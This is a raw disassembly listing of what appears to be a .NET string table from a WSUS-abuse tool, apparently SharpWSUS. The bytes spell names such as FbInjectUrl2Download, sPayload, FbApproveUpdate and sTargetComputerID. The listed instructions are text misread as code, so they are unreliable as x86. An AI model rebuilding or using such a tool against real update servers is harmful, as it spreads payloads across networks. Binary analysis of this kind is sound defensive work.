  405e3f:	34 00                	xor    $0x0,%al
  405e41:	3c 3e                	cmp    $0x3e,%al
  405e43:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405e46:	31 5f 34             	xor    %ebx,0x34(%edi)
  405e49:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405e4c:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405e50:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405e54:	31 5f 34             	xor    %ebx,0x34(%edi)
  405e57:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405e5a:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405e5d:	31 5f 35             	xor    %ebx,0x35(%edi)
  405e60:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405e63:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405e67:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405e6b:	31 5f 35             	xor    %ebx,0x35(%edi)
  405e6e:	00 73 53             	add    %dh,0x53(%ebx)
  405e71:	48                   	dec    %eax
  405e72:	41                   	inc    %ecx
  405e73:	32 35 36 00 3c 3e    	xor    0x3e3c0036,%dh
  405e79:	39 00                	cmp    %eax,(%eax)
  405e7b:	3c 4d                	cmp    $0x4d,%al
  405e7d:	6f                   	outsl  %ds:(%esi),(%dx)
  405e7e:	64 75 6c             	fs jne 0x405eed
  405e81:	65 3e 00 55 70       	gs add %dl,%ds:0x70(%ebp)
  405e86:	64 61                	fs popa
  405e88:	74 65                	je     0x405eef
  405e8a:	4b                   	dec    %ebx
  405e8b:	42                   	inc    %edx
  405e8c:	00 55 70             	add    %dl,0x70(%ebp)
  405e8f:	64 61                	fs popa
  405e91:	74 65                	je     0x405ef8
  405e93:	4d                   	dec    %ebp
  405e94:	53                   	push   %ebx
  405e95:	52                   	push   %edx
  405e96:	43                   	inc    %ebx
  405e97:	00 47 65             	add    %al,0x65(%edi)
  405e9a:	6e                   	outsb  %ds:(%esi),(%dx)
  405e9b:	65 72 61             	gs jb  0x405eff
  405e9e:	74 65                	je     0x405f05
  405ea0:	42                   	inc    %edx
  405ea1:	75 6e                	jne    0x405f11
  405ea3:	64 6c                	fs insb (%dx),%es:(%edi)
  405ea5:	65 47                	gs inc %edi
  405ea7:	55                   	push   %ebp
  405ea8:	49                   	dec    %ecx
  405ea9:	44                   	inc    %esp
  405eaa:	00 47 65             	add    %al,0x65(%edi)
  405ead:	6e                   	outsb  %ds:(%esi),(%dx)
  405eae:	65 72 61             	gs jb  0x405f12
  405eb1:	74 65                	je     0x405f18
  405eb3:	55                   	push   %ebp
  405eb4:	70 64                	jo     0x405f1a
  405eb6:	61                   	popa
  405eb7:	74 65                	je     0x405f1e
  405eb9:	47                   	inc    %edi
  405eba:	55                   	push   %ebp
  405ebb:	49                   	dec    %ecx
  405ebc:	44                   	inc    %esp
  405ebd:	00 47 65             	add    %al,0x65(%edi)
  405ec0:	6e                   	outsb  %ds:(%esi),(%dx)
  405ec1:	65 72 61             	gs jb  0x405f25
  405ec4:	74 65                	je     0x405f2b
  405ec6:	54                   	push   %esp
  405ec7:	61                   	popa
  405ec8:	72 67                	jb     0x405f31
  405eca:	65 74 47             	gs je  0x405f14
  405ecd:	72 6f                	jb     0x405f3e
  405ecf:	75 70                	jne    0x405f41
  405ed1:	47                   	inc    %edi
  405ed2:	55                   	push   %ebp
  405ed3:	49                   	dec    %ecx
  405ed4:	44                   	inc    %esp
  405ed5:	00 73 42             	add    %dh,0x42(%ebx)
  405ed8:	75 6e                	jne    0x405f48
  405eda:	64 6c                	fs insb (%dx),%es:(%edi)
  405edc:	65 49                	gs dec %ecx
  405ede:	44                   	inc    %esp
  405edf:	00 55 70             	add    %dl,0x70(%ebp)
  405ee2:	64 61                	fs popa
  405ee4:	74 65                	je     0x405f4b
  405ee6:	49                   	dec    %ecx
  405ee7:	44                   	inc    %esp
  405ee8:	00 69 52             	add    %ch,0x52(%ecx)
  405eeb:	65 76 69             	gs jbe 0x405f57
  405eee:	73 69                	jae    0x405f59
  405ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  405ef1:	6e                   	outsb  %ds:(%esi),(%dx)
  405ef2:	49                   	dec    %ecx
  405ef3:	44                   	inc    %esp
  405ef4:	00 46 62             	add    %al,0x62(%esi)
  405ef7:	47                   	inc    %edi
  405ef8:	65 74 47             	gs je  0x405f42
  405efb:	72 6f                	jb     0x405f6c
  405efd:	75 70                	jne    0x405f6f
  405eff:	49                   	dec    %ecx
  405f00:	44                   	inc    %esp
  405f01:	00 73 54             	add    %dh,0x54(%ebx)
  405f04:	61                   	popa
  405f05:	72 67                	jb     0x405f6e
  405f07:	65 74 43             	gs je  0x405f4d
  405f0a:	6f                   	outsl  %ds:(%esi),(%dx)
  405f0b:	6d                   	insl   (%dx),%es:(%edi)
  405f0c:	70 75                	jo     0x405f83
  405f0e:	74 65                	je     0x405f75
  405f10:	72 49                	jb     0x405f5b
  405f12:	44                   	inc    %esp
  405f13:	00 73 54             	add    %dh,0x54(%ebx)
  405f16:	61                   	popa
  405f17:	72 67                	jb     0x405f80
  405f19:	65 74 43             	gs je  0x405f5f
  405f1c:	6f                   	outsl  %ds:(%esi),(%dx)
  405f1d:	6d                   	insl   (%dx),%es:(%edi)
  405f1e:	70 75                	jo     0x405f95
  405f20:	74 65                	je     0x405f87
  405f22:	72 54                	jb     0x405f78
  405f24:	61                   	popa
  405f25:	72 67                	jb     0x405f8e
  405f27:	65 74 49             	gs je  0x405f73
  405f2a:	44                   	inc    %esp
  405f2b:	00 48 4b             	add    %cl,0x4b(%eax)
  405f2e:	45                   	inc    %ebp
  405f2f:	59                   	pop    %ecx
  405f30:	5f                   	pop    %edi
  405f31:	4c                   	dec    %esp
  405f32:	4f                   	dec    %edi
  405f33:	43                   	inc    %ebx
  405f34:	41                   	inc    %ecx
  405f35:	4c                   	dec    %esp
  405f36:	5f                   	pop    %edi
  405f37:	4d                   	dec    %ebp
  405f38:	41                   	inc    %ecx
  405f39:	43                   	inc    %ebx
  405f3a:	48                   	dec    %eax
  405f3b:	49                   	dec    %ecx
  405f3c:	4e                   	dec    %esi
  405f3d:	45                   	inc    %ebp
  405f3e:	00 48 45             	add    %cl,0x45(%eax)
  405f41:	58                   	pop    %eax
  405f42:	32 41 53             	xor    0x53(%ecx),%al
  405f45:	43                   	inc    %ebx
  405f46:	49                   	dec    %ecx
  405f47:	49                   	dec    %ecx
  405f48:	00 67 65             	add    %ah,0x65(%edi)
  405f4b:	74 5f                	je     0x405fac
  405f4d:	41                   	inc    %ecx
  405f4e:	53                   	push   %ebx
  405f4f:	43                   	inc    %ebx
  405f50:	49                   	dec    %ecx
  405f51:	49                   	dec    %ecx
  405f52:	00 46 62             	add    %al,0x62(%esi)
  405f55:	47                   	inc    %edi
  405f56:	65 74 57             	gs je  0x405fb0
  405f59:	53                   	push   %ebx
  405f5a:	55                   	push   %ebp
  405f5b:	53                   	push   %ebx
  405f5c:	43                   	inc    %ebx
  405f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  405f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  405f5f:	66 69 67 53 51 4c    	imul   $0x4c51,0x53(%edi),%sp
  405f65:	00 55 70             	add    %dl,0x70(%ebp)
  405f68:	64 61                	fs popa
  405f6a:	74 65                	je     0x405fd1
  405f6c:	55                   	push   %ebp
  405f6d:	52                   	push   %edx
  405f6e:	4c                   	dec    %esp
  405f6f:	00 62 53             	add    %ah,0x53(%edx)
  405f72:	53                   	push   %ebx
  405f73:	4c                   	dec    %esp
  405f74:	00 46 76             	add    %al,0x76(%esi)
  405f77:	43                   	inc    %ebx
  405f78:	68 65 63 6b 53       	push   $0x536b6365
  405f7d:	53                   	push   %ebx
  405f7e:	4c                   	dec    %esp
  405f7f:	00 52 65             	add    %dl,0x65(%edx)
  405f82:	67 53                	addr16 push %ebx
  405f84:	41                   	inc    %ecx
  405f85:	4d                   	dec    %ebp
  405f86:	00 53 79             	add    %dl,0x79(%ebx)
  405f89:	73 74                	jae    0x405fff
  405f8b:	65 6d                	gs insl (%dx),%es:(%edi)
  405f8d:	2e 49                	cs dec %ecx
  405f8f:	4f                   	dec    %edi
  405f90:	00 48 4b             	add    %cl,0x4b(%eax)
  405f93:	45                   	inc    %ebp
  405f94:	59                   	pop    %ecx
  405f95:	5f                   	pop    %edi
  405f96:	43                   	inc    %ebx
  405f97:	55                   	push   %ebp
  405f98:	52                   	push   %edx
  405f99:	52                   	push   %edx
  405f9a:	45                   	inc    %ebp
  405f9b:	4e                   	dec    %esi
  405f9c:	54                   	push   %esp
  405f9d:	5f                   	pop    %edi
  405f9e:	55                   	push   %ebp
  405f9f:	53                   	push   %ebx
  405fa0:	45                   	inc    %ebp
  405fa1:	52                   	push   %edx
  405fa2:	00 73 4f             	add    %dh,0x4f(%ebx)
  405fa5:	53                   	push   %ebx
  405fa6:	00 53 68             	add    %dl,0x68(%ebx)
  405fa9:	61                   	popa
  405faa:	72 70                	jb     0x40601c
  405fac:	57                   	push   %edi
  405fad:	53                   	push   %ebx
  405fae:	55                   	push   %ebp
  405faf:	53                   	push   %ebx
  405fb0:	00 76 61             	add    %dh,0x61(%esi)
  405fb3:	6c                   	insb   (%dx),%es:(%edi)
  405fb4:	75 65                	jne    0x40601b
  405fb6:	5f                   	pop    %edi
  405fb7:	5f                   	pop    %edi
  405fb8:	00 62 61             	add    %ah,0x61(%edx)
  405fbb:	00 53 79             	add    %dl,0x79(%ebx)
  405fbe:	73 74                	jae    0x406034
  405fc0:	65 6d                	gs insl (%dx),%es:(%edi)
  405fc2:	2e 44                	cs inc %esp
  405fc4:	61                   	popa
  405fc5:	74 61                	je     0x406028
  405fc7:	00 6c 70 63          	add    %ch,0x63(%eax,%esi,2)
  405fcb:	62 44 61 74          	bound  %eax,0x74(%ecx,%eiz,2)
  405fcf:	61                   	popa
  405fd0:	00 6c 70 44          	add    %ch,0x44(%eax,%esi,2)
  405fd4:	61                   	popa
  405fd5:	74 61                	je     0x406038
  405fd7:	00 53 79             	add    %dl,0x79(%ebx)
  405fda:	73 74                	jae    0x406050
  405fdc:	65 6d                	gs insl (%dx),%es:(%edi)
  405fde:	2e 57                	cs push %edi
  405fe0:	65 62 00             	bound  %eax,%gs:(%eax)
  405fe3:	6d                   	insl   (%dx),%es:(%edi)
  405fe4:	73 63                	jae    0x406049
  405fe6:	6f                   	outsl  %ds:(%esi),(%dx)
  405fe7:	72 6c                	jb     0x406055
  405fe9:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  405ff0:	53                   	push   %ebx
  405ff1:	79 73                	jns    0x406066
  405ff3:	74 65                	je     0x40605a
  405ff5:	6d                   	insl   (%dx),%es:(%edi)
  405ff6:	2e 43                	cs inc %ebx
  405ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  405ff9:	6c                   	insb   (%dx),%es:(%edi)
  405ffa:	6c                   	insb   (%dx),%es:(%edi)
  405ffb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406000:	6e                   	outsb  %ds:(%esi),(%dx)
  406001:	73 2e                	jae    0x406031
  406003:	47                   	inc    %edi
  406004:	65 6e                	outsb  %gs:(%esi),(%dx)
  406006:	65 72 69             	gs jb  0x406072
  406009:	63 00                	arpl   %eax,(%eax)
  40600b:	52                   	push   %edx
  40600c:	65 61                	gs popa
  40600e:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  406013:	64 00 46 62          	add    %al,%fs:0x62(%esi)
  406017:	49                   	dec    %ecx
  406018:	6e                   	outsb  %ds:(%esi),(%dx)
  406019:	6a 65                	push   $0x65
  40601b:	63 74 55 72          	arpl   %esi,0x72(%ebp,%edx,2)
  40601f:	6c                   	insb   (%dx),%es:(%edi)
  406020:	32 44 6f 77          	xor    0x77(%edi,%ebp,2),%al
  406024:	6e                   	outsb  %ds:(%esi),(%dx)
  406025:	6c                   	insb   (%dx),%es:(%edi)
  406026:	6f                   	outsl  %ds:(%esi),(%dx)
  406027:	61                   	popa
  406028:	64 00 73 50          	add    %dh,%fs:0x50(%ebx)
  40602c:	61                   	popa
  40602d:	79 6c                	jns    0x40609b
  40602f:	6f                   	outsl  %ds:(%esi),(%dx)
  406030:	61                   	popa
  406031:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  406035:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  406039:	41                   	inc    %ecx
  40603a:	31 4d 61             	xor    %ecx,0x61(%ebp)
  40603d:	6e                   	outsb  %ds:(%esi),(%dx)
  40603e:	61                   	popa
  40603f:	67 65 64 00 53 48    	gs add %dl,%fs:0x48(%bp,%di)
  406045:	41                   	inc    %ecx
  406046:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40604c:	61                   	popa
  40604d:	67 65 64 00 62 57    	gs add %ah,%fs:0x57(%bp,%si)
  406053:	53                   	push   %ebx
  406054:	55                   	push   %ebp
  406055:	53                   	push   %ebx
  406056:	49                   	dec    %ecx
  406057:	6e                   	outsb  %ds:(%esi),(%dx)
  406058:	73 74                	jae    0x4060ce
  40605a:	61                   	popa
  40605b:	6c                   	insb   (%dx),%es:(%edi)
  40605c:	6c                   	insb   (%dx),%es:(%edi)
  40605d:	65 64 00 73 61       	gs add %dh,%fs:0x61(%ebx)
  406062:	6d                   	insl   (%dx),%es:(%edi)
  406063:	44                   	inc    %esp
  406064:	65 73 69             	gs jae 0x4060d0
  406067:	72 65                	jb     0x4060ce
  406069:	64 00 6c 70 52       	add    %ch,%fs:0x52(%eax,%esi,2)
  40606e:	65 73 65             	gs jae 0x4060d6
  406071:	72 76                	jb     0x4060e9
  406073:	65 64 00 43 6c       	gs add %al,%fs:0x6c(%ebx)
  406078:	47                   	inc    %edi
  406079:	75 69                	jne    0x4060e4
  40607b:	64 00 4e 65          	add    %cl,%fs:0x65(%esi)
  40607f:	77 47                	ja     0x4060c8
  406081:	75 69                	jne    0x4060ec
  406083:	64 00 3c 50          	add    %bh,%fs:(%eax,%edx,2)
  406087:	61                   	popa
  406088:	72 73                	jb     0x4060fd
  40608a:	65 64 4f             	gs fs dec %edi
  40608d:	6b 3e 6b             	imul   $0x6b,(%esi),%edi
  406090:	5f                   	pop    %edi
  406091:	5f                   	pop    %edi
  406092:	42                   	inc    %edx
  406093:	61                   	popa
  406094:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  406097:	6e                   	outsb  %ds:(%esi),(%dx)
  406098:	67 46                	addr16 inc %esi
  40609a:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  4060a1:	72 67                	jb     0x40610a
  4060a3:	75 6d                	jne    0x406112
  4060a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4060a7:	74 73                	je     0x40611c
  4060a9:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4060ae:	61                   	popa
  4060af:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4060b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4060b3:	67 46                	addr16 inc %esi
  4060b5:	69 65 6c 64 00 42 75 	imul   $0x75420064,0x6c(%ebp),%esp
  4060bc:	69 6c 64 00 49 43 6f 	imul   $0x6d6f4349,0x0(%esp,%eiz,2),%ebp
  4060c3:	6d 
  4060c4:	6d                   	insl   (%dx),%es:(%edi)
  4060c5:	61                   	popa
  4060c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4060c7:	64 00 44 62 43       	add    %al,%fs:0x43(%edx,%eiz,2)
  4060cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4060cd:	6d                   	insl   (%dx),%es:(%edi)
  4060ce:	6d                   	insl   (%dx),%es:(%edi)
  4060cf:	61                   	popa
  4060d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4060d1:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  4060d5:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  4060d9:	65 43                	gs inc %ebx
  4060db:	6f                   	outsl  %ds:(%esi),(%dx)
  4060dc:	6d                   	insl   (%dx),%es:(%edi)
  4060dd:	6d                   	insl   (%dx),%es:(%edi)
  4060de:	61                   	popa
  4060df:	6e                   	outsb  %ds:(%esi),(%dx)
  4060e0:	64 00 53 71          	add    %dl,%fs:0x71(%ebx)
  4060e4:	6c                   	insb   (%dx),%es:(%edi)
  4060e5:	43                   	inc    %ebx
  4060e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4060e7:	6d                   	insl   (%dx),%es:(%edi)
  4060e8:	6d                   	insl   (%dx),%es:(%edi)
  4060e9:	61                   	popa
  4060ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4060eb:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4060ef:	70 6c                	jo     0x40615d
  4060f1:	61                   	popa
  4060f2:	63 65 00             	arpl   %esp,0x0(%ebp)
  4060f5:	73 44                	jae    0x40613b
  4060f7:	61                   	popa
  4060f8:	74 61                	je     0x40615b
  4060fa:	62 61 73             	bound  %esp,0x73(%ecx)
  4060fd:	65 49                	gs dec %ecx
  4060ff:	6e                   	outsb  %ds:(%esi),(%dx)
  406100:	73 74                	jae    0x406176
  406102:	61                   	popa
  406103:	6e                   	outsb  %ds:(%esi),(%dx)
  406104:	63 65 00             	arpl   %esp,0x0(%ebp)
  406107:	46                   	inc    %esi
  406108:	69 6c 65 4d 6f 64 65 	imul   $0x65646f,0x4d(%ebp,%eiz,2),%ebp
  40610f:	00 
  406110:	48                   	dec    %eax
  406111:	74 6d                	je     0x406180
  406113:	6c                   	insb   (%dx),%es:(%edi)
  406114:	45                   	inc    %ebp
  406115:	6e                   	outsb  %ds:(%esi),(%dx)
  406116:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406119:	65 00 53 68          	add    %dl,%gs:0x68(%ebx)
  40611d:	6f                   	outsl  %ds:(%esi),(%dx)
  40611e:	77 55                	ja     0x406175
  406120:	73 61                	jae    0x406183
  406122:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  406127:	74 5f                	je     0x406188
  406129:	4d                   	dec    %ebp
  40612a:	65 73 73             	gs jae 0x4061a0
  40612d:	61                   	popa
  40612e:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  406133:	76 6f                	jbe    0x4061a4
  406135:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  406139:	61                   	popa
  40613a:	74 61                	je     0x40619d
  40613c:	54                   	push   %esp
  40613d:	61                   	popa
  40613e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  406142:	49                   	dec    %ecx
  406143:	44                   	inc    %esp
  406144:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40614b:	6c                   	insb   (%dx),%es:(%edi)
  40614c:	65 00 46 62          	add    %al,%gs:0x62(%esi)
  406150:	50                   	push   %eax
  406151:	72 65                	jb     0x4061b8
  406153:	70 61                	jo     0x4061b6
  406155:	72 65                	jb     0x4061bc
  406157:	42                   	inc    %edx
  406158:	75 6e                	jne    0x4061c8
  40615a:	64 6c                	fs insb (%dx),%es:(%edi)
  40615c:	65 00 67 42          	add    %ah,%gs:0x42(%edi)
  406160:	75 6e                	jne    0x4061d0
  406162:	64 6c                	fs insb (%dx),%es:(%edi)
  406164:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  406168:	46                   	inc    %esi
  406169:	69 6c 65 00 62 50 43 	imul   $0x6f435062,0x0(%ebp,%eiz,2),%ebp
  406170:	6f 
  406171:	70 79                	jo     0x4061ec
  406173:	46                   	inc    %esi
  406174:	69 6c 65 00 46 62 43 	imul   $0x6f436246,0x0(%ebp,%eiz,2),%ebp
  40617b:	6f 
  40617c:	70 79                	jo     0x4061f7
  40617e:	46                   	inc    %esi
  40617f:	69 6c 65 00 43 6f 6e 	imul   $0x736e6f43,0x0(%ebp,%eiz,2),%ebp
  406186:	73 
  406187:	6f                   	outsl  %ds:(%esi),(%dx)
  406188:	6c                   	insb   (%dx),%es:(%edi)
  406189:	65 00 55 70          	add    %dl,%gs:0x70(%ebp)
  40618d:	64 61                	fs popa
  40618f:	74 65                	je     0x4061f6
  406191:	54                   	push   %esp
  406192:	69 74 6c 65 00 67 65 	imul   $0x74656700,0x65(%esp,%ebp,2),%esi
  406199:	74 
  40619a:	5f                   	pop    %edi
  40619b:	43                   	inc    %ebx
  40619c:	6f                   	outsl  %ds:(%esi),(%dx)
  40619d:	6d                   	insl   (%dx),%es:(%edi)
  40619e:	6d                   	insl   (%dx),%es:(%edi)
  40619f:	61                   	popa
  4061a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4061a1:	64 4e                	fs dec %esi
  4061a3:	61                   	popa
  4061a4:	6d                   	insl   (%dx),%es:(%edi)
  4061a5:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  4061a9:	6d                   	insl   (%dx),%es:(%edi)
  4061aa:	6d                   	insl   (%dx),%es:(%edi)
  4061ab:	61                   	popa
  4061ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4061ad:	64 4e                	fs dec %esi
  4061af:	61                   	popa
  4061b0:	6d                   	insl   (%dx),%es:(%edi)
  4061b1:	65 00 73 46          	add    %dh,%gs:0x46(%ebx)
  4061b5:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4061bc:	00 
  4061bd:	47                   	inc    %edi
  4061be:	65 74 46             	gs je  0x406207
  4061c1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4061c8:	00 
  4061c9:	67 65 74 5f          	addr16 gs je 0x40622c
  4061cd:	4d                   	dec    %ebp
  4061ce:	61                   	popa
  4061cf:	63 68 69             	arpl   %ebp,0x69(%eax)
  4061d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d3:	65 4e                	gs dec %esi
  4061d5:	61                   	popa
  4061d6:	6d                   	insl   (%dx),%es:(%edi)
  4061d7:	65 00 46 76          	add    %al,%gs:0x76(%esi)
  4061db:	44                   	inc    %esp
  4061dc:	61                   	popa
  4061dd:	74 61                	je     0x406240
  4061df:	62 61 73             	bound  %esp,0x73(%ecx)
  4061e2:	65 42                	gs inc %edx
  4061e4:	61                   	popa
  4061e5:	73 65                	jae    0x40624c
  4061e7:	4e                   	dec    %esi
  4061e8:	61                   	popa
  4061e9:	6d                   	insl   (%dx),%es:(%edi)
  4061ea:	65 00 73 44          	add    %dh,%gs:0x44(%ebx)
  4061ee:	61                   	popa
  4061ef:	74 61                	je     0x406252
  4061f1:	62 61 73             	bound  %esp,0x73(%ecx)
  4061f4:	65 4e                	gs dec %esi
  4061f6:	61                   	popa
  4061f7:	6d                   	insl   (%dx),%es:(%edi)
  4061f8:	65 00 6c 70 56       	add    %ch,%gs:0x56(%eax,%esi,2)
  4061fd:	61                   	popa
  4061fe:	6c                   	insb   (%dx),%es:(%edi)
  4061ff:	75 65                	jne    0x406266
  406201:	4e                   	dec    %esi
  406202:	61                   	popa
  406203:	6d                   	insl   (%dx),%es:(%edi)
  406204:	65 00 47 72          	add    %al,%gs:0x72(%edi)
  406208:	6f                   	outsl  %ds:(%esi),(%dx)
  406209:	75 70                	jne    0x40627b
  40620b:	4e                   	dec    %esi
  40620c:	61                   	popa
  40620d:	6d                   	insl   (%dx),%es:(%edi)
  40620e:	65 00 46 76          	add    %al,%gs:0x76(%esi)
  406212:	46                   	inc    %esi
  406213:	75 6c                	jne    0x406281
  406215:	6c                   	insb   (%dx),%es:(%edi)
  406216:	43                   	inc    %ebx
  406217:	6f                   	outsl  %ds:(%esi),(%dx)
  406218:	6d                   	insl   (%dx),%es:(%edi)
  406219:	70 75                	jo     0x406290
  40621b:	74 65                	je     0x406282
  40621d:	72 4e                	jb     0x40626d
  40621f:	61                   	popa
  406220:	6d                   	insl   (%dx),%es:(%edi)
  406221:	65 00 73 43          	add    %dh,%gs:0x43(%ebx)
  406225:	6f                   	outsl  %ds:(%esi),(%dx)
  406226:	6d                   	insl   (%dx),%es:(%edi)
  406227:	70 75                	jo     0x40629e
  406229:	74 65                	je     0x406290
  40622b:	72 4e                	jb     0x40627b
  40622d:	61                   	popa
  40622e:	6d                   	insl   (%dx),%es:(%edi)
  40622f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406233:	74 5f                	je     0x406294
  406235:	48                   	dec    %eax
  406236:	6f                   	outsl  %ds:(%esi),(%dx)
  406237:	73 74                	jae    0x4062ad
  406239:	4e                   	dec    %esi
  40623a:	61                   	popa
  40623b:	6d                   	insl   (%dx),%es:(%edi)
  40623c:	65 00 69 6e          	add    %ch,%gs:0x6e(%ecx)
  406240:	4b                   	dec    %ebx
  406241:	65 79 4e             	gs jns 0x406292
  406244:	61                   	popa
  406245:	6d                   	insl   (%dx),%es:(%edi)
  406246:	65 00 69 6e          	add    %ch,%gs:0x6e(%ecx)
  40624a:	50                   	push   %eax
  40624b:	72 6f                	jb     0x4062bc
  40624d:	70 65                	jo     0x4062b4
  40624f:	72 74                	jb     0x4062c5
  406251:	79 4e                	jns    0x4062a1
  406253:	61                   	popa
  406254:	6d                   	insl   (%dx),%es:(%edi)
  406255:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
  406259:	6c                   	insb   (%dx),%es:(%edi)
  40625a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40625c:	61                   	popa
  40625d:	6d                   	insl   (%dx),%es:(%edi)
  40625e:	65 00 41 70          	add    %al,%gs:0x70(%ecx)
  406262:	70 65                	jo     0x4062c9
  406264:	6e                   	outsb  %ds:(%esi),(%dx)
  406265:	64 4c                	fs dec %esp
  406267:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  40626e:	74 65                	je     0x4062d5
  406270:	4c                   	dec    %esp
  406271:	69 6e 65 00 6c 70 54 	imul   $0x54706c00,0x65(%esi),%ebp
  406278:	79 70                	jns    0x4062ea
  40627a:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40627e:	6c                   	insb   (%dx),%es:(%edi)
  40627f:	65 53                	gs push %ebx
  406281:	68 61 72 65 00       	push   $0x657261
  406286:	46                   	inc    %esi
  406287:	61                   	popa
  406288:	69 6c 75 72 65 00 43 	imul   $0x6c430065,0x72(%ebp,%esi,2),%ebp
  40628f:	6c 
  406290:	6f                   	outsl  %ds:(%esi),(%dx)
  406291:	73 65                	jae    0x4062f8
  406293:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  406297:	70 6f                	jo     0x406308
  406299:	73 65                	jae    0x406300
  40629b:	00 50 61             	add    %dl,0x61(%eax)
  40629e:	72 73                	jb     0x406313
  4062a0:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4062a4:	76 65                	jbe    0x40630b
  4062a6:	72 73                	jb     0x40631b
  4062a8:	65 00 55 70          	add    %dl,%gs:0x70(%ebp)
  4062ac:	64 61                	fs popa
  4062ae:	74 65                	je     0x406315
  4062b0:	44                   	inc    %esp
  4062b1:	61                   	popa
  4062b2:	74 65                	je     0x406319
  4062b4:	00 4c 6f 63          	add    %cl,0x63(%edi,%ebp,2)
  4062b8:	61                   	popa
  4062b9:	74 65                	je     0x406320
  4062bb:	00 46 62             	add    %al,0x62(%esi)
  4062be:	44                   	inc    %esp
  4062bf:	65 6c                	gs insb (%dx),%es:(%edi)
  4062c1:	65 74 65             	gs je  0x406329
  4062c4:	55                   	push   %ebp
  4062c5:	70 64                	jo     0x40632b
  4062c7:	61                   	popa
  4062c8:	74 65                	je     0x40632f
  4062ca:	00 46 62             	add    %al,0x62(%esi)
  4062cd:	41                   	inc    %ecx
  4062ce:	70 70                	jo     0x406340
  4062d0:	72 6f                	jb     0x406341
  4062d2:	76 65                	jbe    0x406339
  4062d4:	55                   	push   %ebp
  4062d5:	70 64                	jo     0x40633b
  4062d7:	61                   	popa
  4062d8:	74 65                	je     0x40633f
  4062da:	00 67 55             	add    %ah,0x55(%edi)
  4062dd:	70 64                	jo     0x406343
  4062df:	61                   	popa
  4062e0:	74 65                	je     0x406347
  4062e2:	00 46 62             	add    %al,0x62(%esi)
  4062e5:	49                   	dec    %ecx
  4062e6:	6d                   	insl   (%dx),%es:(%edi)
  4062e7:	70 6f                	jo     0x406358
  4062e9:	72 74                	jb     0x40635f
  4062eb:	55                   	push   %ebp
  4062ec:	70 64                	jo     0x406352
  4062ee:	61                   	popa
  4062ef:	74 65                	je     0x406356
  4062f1:	00 43 72             	add    %al,0x72(%ebx)
  4062f4:	65 61                	gs popa
  4062f6:	74 65                	je     0x40635d
  4062f8:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  4062fc:	75 67                	jne    0x406365
  4062fe:	67 65 72 42          	addr16 gs jb 0x406344
  406302:	72 6f                	jb     0x406373
  406304:	77 73                	ja     0x406379
  406306:	61                   	popa
  406307:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40630b:	74 61                	je     0x40636e
  40630d:	74 65                	je     0x406374
  40630f:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  406313:	65 74 65             	gs je  0x40637b
  406316:	00 57 72             	add    %dl,0x72(%edi)
  406319:	69 74 65 00 43 6f 6d 	imul   $0x706d6f43,0x0(%ebp,%eiz,2),%esi
  406320:	70 
  406321:	69 6c 65 72 47 65 6e 	imul   $0x656e6547,0x72(%ebp,%eiz,2),%ebp
  406328:	65 
  406329:	72 61                	jb     0x40638c
  40632b:	74 65                	je     0x406392
  40632d:	64 41                	fs inc %ecx
  40632f:	74 74                	je     0x4063a5
  406331:	72 69                	jb     0x40639c
  406333:	62 75 74             	bound  %esi,0x74(%ebp)
